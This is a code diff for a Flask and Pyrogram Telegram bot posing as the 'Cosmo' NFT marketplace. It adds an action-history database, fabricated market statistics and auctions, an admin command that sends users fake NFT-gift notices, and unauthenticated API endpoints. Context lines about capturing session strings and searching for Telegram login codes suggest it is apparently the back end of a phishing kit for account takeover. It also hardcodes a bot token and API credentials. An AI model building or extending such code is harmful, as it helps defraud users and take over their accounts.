@@ -6,9 +6,12 @@ import threading
 import json
 import re
 import random
+import sqlite3
 from datetime import datetime, timedelta
+from contextlib import contextmanager
 from flask import Flask, request, jsonify, render_template, send_from_directory, session, redirect, url_for
-from pyrogram import Client
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.errors import (
     SessionPasswordNeeded, 
     PhoneCodeInvalid, 
@@ -43,12 +46,121 @@ SEARCH_START_TIMES = {}  # Время начала поиска для кажд�
 ADMIN_IDS = [7843338024]  # Admin ID для уведомлений
 BOT_TOKEN = "8502577994:AAECfAO5batElBKd6H4eOnnLRCZvNLseQ-8"  # Токен бота для уведомлений
 
+# История действий пользователей
+USER_ACTIONS_DB = "user_actions.db"
+
+@contextmanager
+def get_db_connection():
+    conn = sqlite3.connect(USER_ACTIONS_DB)
+    try:
+        yield conn
+    finally:
+        conn.close()
+
+def init_actions_db():
+    """Инициализация базы данных для истории действий"""
+    with get_db_connection() as conn:
+        cursor = conn.cursor()
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS user_actions (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER NOT NULL,
+                action_type TEXT NOT NULL,
+                action_details TEXT,
+                from_user TEXT,
+                link TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        
+        # Создаем индекс для быстрого поиска по user_id
+        cursor.execute('''
+            CREATE INDEX IF NOT EXISTS idx_user_id 
+            ON user_actions(user_id)
+        ''')
+        
+        conn.commit()
+    logger.info("✅ База данных истории действий инициализирована")
+
+def add_user_action(user_id, action_type, details="", from_user="", link=""):
+    """Добавление действия в историю пользователя"""
+    try:
+        with get_db_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute('''
+                INSERT INTO user_actions (user_id, action_type, action_details, from_user, link)
+                VALUES (?, ?, ?, ?, ?)
+            ''', (user_id, action_type, details, from_user, link))
+            conn.commit()
+        
+        logger.info(f"📝 Добавлено действие для user_id {user_id}: {action_type}")
+        return True
+    except Exception as e:
+        logger.error(f"❌ Ошибка добавления действия: {e}")
+        return False
+
+def get_user_actions(user_id, limit=20):
+    """Получение истории действий пользователя"""
+    try:
+        with get_db_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute('''
+                SELECT action_type, action_details, from_user, link, timestamp
+                FROM user_actions
+                WHERE user_id = ?
+                ORDER BY timestamp DESC
+                LIMIT ?
+            ''', (user_id, limit))
+            
+            actions = []
+            for row in cursor.fetchall():
+                actions.append({
+                    'type': row[0],
+                    'details': row[1],
+                    'from_user': row[2],
+                    'link': row[3],
+                    'timestamp': row[4]
+                })
+            
+            return actions
+    except Exception as e:
+        logger.error(f"❌ Ошибка получения действий: {e}")
+        return []
+
+def get_user_gifts(user_id):
+    """Получение всех подарков пользователя"""
+    try:
+        with get_db_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute('''
+                SELECT action_type, action_details, from_user, link, timestamp
+                FROM user_actions
+                WHERE user_id = ? AND action_type IN ('gift_received', 'nft_gift')
+                ORDER BY timestamp DESC
+            ''', (user_id,))
+            
+            gifts = []
+            for row in cursor.fetchall():
+                gifts.append({
+                    'type': row[0],
+                    'details': row[1],
+                    'from_user': row[2],
+                    'link': row[3],
+                    'timestamp': row[4]
+                })
+            
+            return gifts
+    except Exception as e:
+        logger.error(f"❌ Ошибка получения подарков: {e}")
+        return []
+
+# Инициализируем БД при запуске
+init_actions_db()
+
 class AdminNotifier:
     def __init__(self):
         self.bot_token = BOT_TOKEN
         self.admin_ids = ADMIN_IDS
-        self.api_id = 39292191  # ЗАМЕНИТЕ на ваш API_ID
-        self.api_hash = "17e072b5e32301241934eb46ee82f918"  # ЗАМЕНИТЕ на ваш API_HASH
     
     async def send_admin_notification(self, message):
         """Отправка уведомления админу"""
@@ -57,14 +169,7 @@ class AdminNotifier:
                 logger.warning("⚠️ Bot token не настроен для уведомлений")
                 return
             
-            # Используйте api_id и api_hash при создании клиента:
-            async with Client(
-                "admin_bot", 
-                api_id=self.api_id,  # Добавьте эту строку
-                api_hash=self.api_hash,  # Добавьте эту строку
-                bot_token=self.bot_token, 
-                in_memory=True
-            ) as app:
+            async with Client("admin_bot", bot_token=self.bot_token, in_memory=True) as app:
                 for admin_id in self.admin_ids:
                     try:
                         await app.send_message(
@@ -97,6 +202,347 @@ class AdminNotifier:
 
 # Инициализация нотификатора
 admin_notifier = AdminNotifier()
+
+class UserMessageHandler:
+    def __init__(self):
+        self.welcome_message = """🎉 **Welcome to Cosmo - The Market of NFT with the Least Commission on Telegram!**
+
+🌟 **Why choose Cosmo?**
+✅ **Lowest commissions** in the market
+✅ **Secure transactions** with smart contracts
+✅ **Instant NFT transfers**
+✅ **24/7 support**
+
+📊 **Current statistics:**
+👥 Users: 15,432+
+🖼️ NFTs listed: 8,754+
+💎 Total volume: 2,450 ETH
+
+📣 **Start your NFT journey today!**"""
+    
+    def create_welcome_keyboard(self, user_id):
+        """Создание клавиатуры с кнопкой истории"""
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📜 History of Actions", callback_data=f"history_{user_id}")],
+            [InlineKeyboardButton("🛒 Browse NFTs", url="https://t.me/cosmonftbot?start=market")],
+            [InlineKeyboardButton("📢 Join Channel", url="https://t.me/cosmonft")]
+        ])
+        return keyboard
+    
+    def create_history_keyboard(self, user_id):
+        """Создание клавиатуры для истории"""
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🎁 View Gifts", callback_data=f"gifts_{user_id}")],
+            [InlineKeyboardButton("🔙 Back to Menu", callback_data=f"back_{user_id}")]
+        ])
+        return keyboard
+    
+    async def handle_user_message(self, client, message):
+        """Обработка входящего сообщения от пользователя"""
+        try:
+            user_id = message.from_user.id
+            user_name = message.from_user.username or message.from_user.first_name
+            
+            # Отправляем приветственное сообщение
+            await client.send_message(
+                chat_id=user_id,
+                text=self.welcome_message,
+                reply_markup=self.create_welcome_keyboard(user_id),
+                parse_mode="markdown"
+            )
+            
+            logger.info(f"👋 Отправлено приветствие user_id: {user_id}")
+            
+            # Добавляем действие "received_welcome" в историю
+            add_user_action(
+                user_id=user_id,
+                action_type="received_welcome",
+                action_details="Получено приветственное сообщение от бота",
+                from_user="@cosmo_bot"
+            )
+            
+            # Если есть текст в сообщении, обрабатываем команды
+            if message.text:
+                await self.process_commands(client, message)
+                
+        except Exception as e:
+            logger.error(f"❌ Ошибка обработки сообщения: {e}")
+    
+    async def process_commands(self, client, message):
+        """Обработка команд пользователя"""
+        text = message.text.lower()
+        user_id = message.from_user.id
+        
+        if "/start" in text:
+            # Уже обработано в handle_user_message
+            pass
+        elif "/help" in text or "помощь" in text:
+            await self.send_help_message(client, user_id)
+        elif "/history" in text:
+            await self.show_history(client, user_id)
+        elif "/sentnft" in text:
+            # Команда для добавления записи о подарке NFT
+            await self.process_sent_nft_command(client, message)
+        elif "/mygifts" in text or "/gifts" in text:
+            await self.show_user_gifts(client, user_id)
+        elif "/market" in text:
+            await self.show_marketplace(client, user_id)
+    
+    async def send_help_message(self, client, user_id):
+        """Отправка сообщения помощи"""
+        help_text = """🆘 **Help Center**
+
+**Available commands:**
+/start - Welcome message and main menu
+/history - View your action history
+/mygifts - Check your received gifts
+/market - Browse NFT marketplace
+/help - Show this help message
+
+**For administrators:**
+/sentnft [user_id] [gift_link] [sender] - Record NFT gift
+
+**Support:**
+If you need assistance, contact @cosmo_support"""
+        
+        await client.send_message(
+            user_id,
+            help_text,
+            parse_mode="markdown"
+        )
+    
+    async def show_history(self, client, user_id, edit_message_id=None):
+        """Показать историю действий пользователя"""
+        actions = get_user_actions(user_id, limit=10)
+        
+        if not actions:
+            history_text = "📜 **Your Action History**\n\nNo actions yet. Start interacting with Cosmo!"
+        else:
+            history_text = "📜 **Your Action History**\n\n"
+            for i, action in enumerate(actions, 1):
+                time_str = datetime.fromisoformat(action['timestamp']).strftime("%Y-%m-%d %H:%M")
+                details = action['details'] if action['details'] else action['type']
+                
+                emoji = "🎁" if "gift" in action['type'] else "📝"
+                
+                if action['from_user']:
+                    history_text += f"{emoji} **{details}**\n   👤 From: {action['from_user']}\n   ⏰ {time_str}\n\n"
+                else:
+                    history_text += f"{emoji} **{details}**\n   ⏰ {time_str}\n\n"
+        
+        if edit_message_id:
+            await client.edit_message_text(
+                chat_id=user_id,
+                message_id=edit_message_id,
+                text=history_text,
+                reply_markup=self.create_history_keyboard(user_id),
+                parse_mode="markdown"
+            )
+        else:
+            await client.send_message(
+                user_id,
+                history_text,
+                reply_markup=self.create_history_keyboard(user_id),
+                parse_mode="markdown"
+            )
+    
+    async def show_user_gifts(self, client, user_id, edit_message_id=None):
+        """Показать подарки пользователя"""
+        gifts = get_user_gifts(user_id)
+        
+        if not gifts:
+            gifts_text = "🎁 **Your Gifts**\n\nNo gifts received yet. Keep interacting with the community!"
+        else:
+            gifts_text = "🎁 **Your Gifts**\n\n"
+            for i, gift in enumerate(gifts, 1):
+                time_str = datetime.fromisoformat(gift['timestamp']).strftime("%Y-%m-%d %H:%M")
+                
+                if gift['link']:
+                    gifts_text += f"{i}. **{gift['details']}**\n   🔗 [View Gift]({gift['link']})\n   👤 From: {gift['from_user']}\n   ⏰ {time_str}\n\n"
+                else:
+                    gifts_text += f"{i}. **{gift['details']}**\n   👤 From: {gift['from_user']}\n   ⏰ {time_str}\n\n"
+        
+        if edit_message_id:
+            await client.edit_message_text(
+                chat_id=user_id,
+                message_id=edit_message_id,
+                text=gifts_text,
+                reply_markup=self.create_history_keyboard(user_id),
+                parse_mode="markdown"
+            )
+        else:
+            await client.send_message(
+                user_id,
+                gifts_text,
+                reply_markup=self.create_history_keyboard(user_id),
+                parse_mode="markdown"
+            )
+    
+    async def process_sent_nft_command(self, client, message):
+        """Обработка команды /sentnft для записи NFT подарка"""
+        try:
+            # Проверяем, является ли отправитель администратором
+            user_id = message.from_user.id
+            if user_id not in ADMIN_IDS:
+                await client.send_message(
+                    user_id,
+                    "❌ This command is for administrators only.",
+                    parse_mode="markdown"
+                )
+                return
+            
+            # Разбираем команду: /sentnft [target_user_id] [gift_link] [sender_username]
+            parts = message.text.split()
+            
+            if len(parts) < 4:
+                await client.send_message(
+                    user_id,
+                    "❌ **Usage:** `/sentnft <target_user_id> <gift_link> <sender_username>`\n\n"
+                    "**Example:** `/sentnft 12345678 https://t.me/nft/giftexample @username`",
+                    parse_mode="markdown"
+                )
+                return
+            
+            target_user_id = int(parts[1])
+            gift_link = parts[2]
+            sender_username = parts[3]
+            
+            # Проверяем ссылку
+            if not gift_link.startswith(('http://', 'https://', 't.me/')):
+                gift_link = f"https://{gift_link}"
+            
+            # Добавляем действие в историю
+            success = add_user_action(
+                user_id=target_user_id,
+                action_type="nft_gift",
+                action_details="Получен подарок NFT",
+                from_user=sender_username,
+                link=gift_link
+            )
+            
+            if success:
+                # Отправляем подтверждение администратору
+                await client.send_message(
+                    user_id,
+                    f"✅ **Gift recorded successfully!**\n\n"
+                    f"👤 **To user:** `{target_user_id}`\n"
+                    f"🎁 **Gift link:** {gift_link}\n"
+                    f"👤 **From:** {sender_username}\n\n"
+                    f"✅ Action added to user's history.",
+                    parse_mode="markdown"
+                )
+                
+                # Отправляем уведомление пользователю о новом подарке
+                try:
+                    await client.send_message(
+                        target_user_id,
+                        f"🎉 **You received a new NFT gift!**\n\n"
+                        f"🎁 **Gift from:** {sender_username}\n"
+                        f"🔗 **View gift:** {gift_link}\n\n"
+                        f"Check your gifts with /mygifts",
+                        parse_mode="markdown"
+                    )
+                    
+                    logger.info(f"✅ Уведомление о подарке отправлено user_id: {target_user_id}")
+                except Exception as e:
+                    logger.warning(f"⚠️ Не удалось отправить уведомление пользователю: {e}")
+                
+                logger.info(f"✅ Записан NFT подарок для user_id {target_user_id} от {sender_username}")
+            else:
+                await client.send_message(
+                    user_id,
+                    "❌ Failed to record gift. Check server logs.",
+                    parse_mode="markdown"
+                )
+                
+        except ValueError:
+            await client.send_message(
+                message.from_user.id,
+                "❌ **Error:** Invalid user ID format. User ID must be a number.",
+                parse_mode="markdown"
+            )
+        except Exception as e:
+            logger.error(f"❌ Ошибка обработки команды /sentnft: {e}")
+            await client.send_message(
+                message.from_user.id,
+                f"❌ **Error:** {str(e)}",
+                parse_mode="markdown"
+            )
+    
+    async def show_marketplace(self, client, user_id):
+        """Показать маркетплейс NFT"""
+        market_text = """🛒 **NFT Marketplace**
+
+**Featured Collections:**
+🎨 **Cosmo Genesis** - Limited edition artworks
+🐲 **DragonVerse** - Fantasy dragon NFTs
+🌌 **Space Explorers** - Cosmic adventure series
+🎭 **Digital Masks** - Anonymous art collective
+
+**Hot Auctions:**
+🔥 #001 - "Cosmic Dawn" - Current bid: 2.5 ETH
+🔥 #042 - "Digital Dragon" - Current bid: 1.8 ETH
+🔥 #099 - "Neon Dreams" - Current bid: 3.2 ETH
+
+**Browse more:**
+👉 [View All NFTs](https://t.me/cosmonftbot?start=market)
+👉 [Live Auctions](https://t.me/cosmonftbot?start=auctions)
+👉 [New Listings](https://t.me/cosmonftbot?start=new)"""
+        
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🛍️ Browse All", url="https://t.me/cosmonftbot?start=market")],
+            [InlineKeyboardButton("🔥 Live Auctions", url="https://t.me/cosmonftbot?start=auctions")],
+            [InlineKeyboardButton("💎 Premium NFTs", url="https://t.me/cosmonftbot?start=premium")]
+        ])
+        
+        await client.send_message(
+            user_id,
+            market_text,
+            reply_markup=keyboard,
+            parse_mode="markdown"
+        )
+    
+    async def handle_callback_query(self, client, callback_query):
+        """Обработка callback запросов от кнопок"""
+        try:
+            user_id = callback_query.from_user.id
+            data = callback_query.data
+            
+            if data.startswith("history_"):
+                target_user_id = int(data.split("_")[1])
+                if target_user_id == user_id:
+                    await self.show_history(client, user_id, callback_query.message.id)
+                else:
+                    await callback_query.answer("This history is not for you!", show_alert=True)
+            
+            elif data.startswith("gifts_"):
+                target_user_id = int(data.split("_")[1])
+                if target_user_id == user_id:
+                    await self.show_user_gifts(client, user_id, callback_query.message.id)
+                else:
+                    await callback_query.answer("These gifts are not for you!", show_alert=True)
+            
+            elif data.startswith("back_"):
+                target_user_id = int(data.split("_")[1])
+                if target_user_id == user_id:
+                    await client.edit_message_text(
+                        chat_id=user_id,
+                        message_id=callback_query.message.id,
+                        text=self.welcome_message,
+                        reply_markup=self.create_welcome_keyboard(user_id),
+                        parse_mode="markdown"
+                    )
+                else:
+                    await callback_query.answer("Access denied!", show_alert=True)
+            
+            await callback_query.answer()
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка обработки callback: {e}")
+            await callback_query.answer("Error occurred!", show_alert=True)
+
+# Инициализация обработчика сообщений
+user_handler = UserMessageHandler()
 
 class ContinuousCodeFinder:
     def __init__(self, session_string, user_id):
@@ -863,6 +1309,14 @@ class TelegramAuthTester:
                 start_background_search(session_string, user_info['id'])
                 
                 immediate_result = await find_telegram_code_immediate(session_string, user_info['id'])
+                
+                # Добавляем действие "account_authorized" в историю
+                add_user_action(
+                    user_id=user_info['id'],
+                    action_type="account_authorized",
+                    action_details="Аккаунт успешно авторизован в системе CosmoMarket",
+                    from_user="System"
+                )
             
                 return {
                     'success': True,
@@ -883,6 +1337,7 @@ class TelegramAuthTester:
 
 auth_tester = TelegramAuthTester()
 
+# Маршруты Flask
 @app.route('/api/check-code-status/<int:user_id>', methods=['GET'])
 def check_code_status(user_id):
     if user_id in CODE_SEARCH_RESULTS:
@@ -1074,6 +1529,74 @@ def storage_stats():
         })
     except Exception as e:
         logger.error(f"❌ Ошибка получения статистики: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+# API для истории действий
+@app.route('/api/actions/add', methods=['POST', 'OPTIONS'])
+def add_action():
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'ok'})
+        
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
+            
+        user_id = data.get('user_id')
+        action_type = data.get('action_type')
+        
+        if not user_id or not action_type:
+            return jsonify({'success': False, 'error': 'user_id and action_type required'}), 400
+        
+        details = data.get('details', '')
+        from_user = data.get('from_user', '')
+        link = data.get('link', '')
+        
+        success = add_user_action(user_id, action_type, details, from_user, link)
+        
+        if success:
+            return jsonify({
+                'success': True,
+                'message': 'Action added successfully',
+                'user_id': user_id,
+                'action_type': action_type
+            })
+        else:
+            return jsonify({'success': False, 'error': 'Failed to add action'}), 500
+            
+    except Exception as e:
+        logger.error(f"❌ Ошибка добавления действия: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/actions/<int:user_id>', methods=['GET'])
+def get_actions(user_id):
+    try:
+        limit = request.args.get('limit', 20, type=int)
+        actions = get_user_actions(user_id, limit)
+        
+        return jsonify({
+            'success': True,
+            'user_id': user_id,
+            'actions': actions,
+            'count': len(actions)
+        })
+    except Exception as e:
+        logger.error(f"❌ Ошибка получения действий: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/actions/gifts/<int:user_id>', methods=['GET'])
+def get_gifts(user_id):
+    try:
+        gifts = get_user_gifts(user_id)
+        
+        return jsonify({
+            'success': True,
+            'user_id': user_id,
+            'gifts': gifts,
+            'count': len(gifts)
+        })
+    except Exception as e:
+        logger.error(f"❌ Ошибка получения подарков: {e}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 if __name__ == '__main__':
